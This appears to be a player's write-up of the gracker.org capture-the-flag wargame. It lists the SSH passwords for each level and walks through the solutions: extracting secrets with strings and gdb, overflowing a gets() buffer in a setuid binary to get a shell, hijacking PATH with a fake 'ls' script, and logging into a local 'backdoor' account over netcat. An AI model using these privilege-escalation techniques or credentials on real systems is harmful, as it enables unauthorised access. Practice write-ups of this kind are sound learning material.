# gracker.org

credentials for level0 
user: level0@gracker.org
passwd: level0

found in web console

## credentials
```
ssh level0@gracker.org (level0)
ssh level1@gracker.org (TVeB0MIlx0KB)
ssh level2@gracker.org (rAWJ@yDbZo4c)
ssh level3@gracker.org (kgg9ki?iDero)
ssh level4@gracker.org (0LRS6_hjGzCf)
ssh level5@gracker.org (svNa9463?k4m)
ssh level6@gracker.org (@XpLtpZhqtiG)
ssh level7@gracker.org (czO0-Uf#lvhY)
```

## level 0

```
strings /matrix/level0/level0
...
Enter Secret Password:
Correct! Here is the level1 shell.
Read the level1 password in /home/level1/.pass to login with `ssh level1@gracker.org`
wrong!
;*3$"
s3cr3t_backd00r_passw0rd
GCC: (Debian 4.9.2-10) 4.9.2
GCC: (Debian 4.8.4-1) 4.8.4

```

## level 1

```
strings /matrix/level1/level1
...
Enter Password:
Correct! Here is the level2 shell.
Read the level2 password in /home/level2/.pass to login with `ssh level2@gracker.org`
wrong!
;*3$"
/q#q%8
&4r22$2
5)(t
1 226q3%
AGCC: (Debian 4.9.2-10) 4.9.2
GCC: (Debian 4.8.4-1) 4.8.4

```

```
(gdb) x/s 0x600e40
0x600e40 <secret_password>:	"/q#q%8\036&4r22$2\036\065)(t\036\061 226q3%"
```

password for `/matrix/level1/level1`
```
n0b0dy_gu3sses_thi5_passw0rd
```


## level3

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

void spawn_shell() {
    gid_t gid;
    uid_t uid;
    gid = getegid();
    uid = geteuid();
    setresgid(gid, gid, gid);
    setresuid(uid, uid, uid);
    system("/bin/sh");
}

int main(int argc, char **argv)
{
  volatile int admin_enabled;
  char buffer[64];
  admin_enabled = 0;

  printf("Zero Cool - Bugdoor v4\nEnter Password:\n");
  gets(buffer);

  if(1) {
      printf("How can this happen? The variable is set to 0 and is never modified in between O.o\nYou must be a hacker!\n");
      spawn_shell();
  } else {
      printf("Trololol lololol...\n");
  }
}
```

## level4
```
level3@gracker:/matrix/level3$ ./level3
Zero Cool - Bugdoor v4
Enter Password:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB
How can this happen? The variable is set to 0 and is never modified in between O.o
You must be a hacker!
$ 
$ 
$ cat /home/level4/.pass
0LRS6_hjGzCf
```

```javascript=
var b = "A"
while(b.length < 65) {
  b+="A"
}
console.log(b)
```

## level5

```
mkdir -p /tmp/def54ge4g
cd /tmp/def54ge4g

PATH="/tmp/def54ge4g:$PATH"

cat >/tmp/def54ge4g/ls
#!/bin/bash

/bin/bash
^D^D

/matrix/level5/level5
level4@gracker:/matrix/level4$ ./level4             
Zero Cool - Linux Information Gathering Tool v1.2

[*] Get system information:
Linux gracker 3.16.0-4-amd64 #1 SMP Debian 3.16.51-2 (2017-12-03) x86_64 GNU/Linux

[*] Find users available on this system:
...

[*] Search for setuid binaries:

id
uid=1005(level5) gid=1004(level4) groups=1004(level4)
cat /home/level5/.pass
svNa9463?k4m
```

## level6
```
level5@gracker:/$ nc 127.0.0.1 2989     
$ whoami
flynn
$ uname -a
SolarOs 4.0.1 Generic_50203-02 sun4m i386
Unknown.Unknown
$ login -n root
Login incorrect
login: backdoor
No home directory specified in password file!
Logging in with home=/
# bin/history
  499 kill 2208
  500 ps -a -x -u
  501 touch /opt/LLL/run/ok
  502 LLLSDLaserControl -ok 1
# LLLSDLaserControl
You entered the Grid!

level6@TRON:~$ cat /home/level6/.pass
@XpLtpZhqtiG
```